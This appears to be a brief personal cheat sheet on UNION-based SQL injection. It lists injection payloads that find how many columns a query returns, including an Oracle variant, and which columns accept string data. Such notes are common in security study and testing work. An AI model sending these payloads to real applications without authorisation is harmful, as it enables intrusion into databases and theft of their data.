#sqli 


## Find Number of Columns Non-Oracle DB
```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL--
```
…
→ While the number of null, doesn’t match the number of columns of the query, we will have an error.

## Find Number of Columns Oracle DB
```sql
' UNION SELECT NULL FROM DUAL-- 
```
...

## Find columns compatible with string
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
```
```sql
' UNION SELECT NULL,'a',NULL,NULL--
```
```sql
' UNION SELECT NULL,NULL,'a',NULL--
```
…
-> Return an error when not compatible with string. 